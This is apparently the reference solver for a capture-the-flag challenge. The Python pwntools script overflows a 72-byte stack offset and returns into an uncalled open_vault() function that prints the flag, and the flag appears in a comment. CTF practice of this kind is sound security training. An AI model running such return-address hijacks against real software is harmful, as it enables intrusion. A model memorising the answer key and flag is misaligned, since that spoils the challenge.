#!/usr/bin/env python3
# CAT THE WRONG FLAG - reference exploit.
# The flag is XOR-encrypted in the binary; open_vault() decrypts+prints it but
# is never called. Overflow vuln() and return into open_vault().
from pwn import *

context.binary = e = ELF("dist/challenge", checksec=False)
OFFSET = 72                               # 64-byte buf + 8 saved rbp
ret = ROP(e).find_gadget(["ret"])[0]      # 16-byte stack alignment for puts()

p = e.process()                           # or remote(HOST, PORT)
p.recvuntil(b"fetch it:")
p.sendline(flat({OFFSET: [ret, e.sym["open_vault"]]}))
print(p.recvall(timeout=3).decode(errors="replace"))
# -> ZeroSecure{c0ntr0l_fl0w_0p3ns_th3_v4ult}
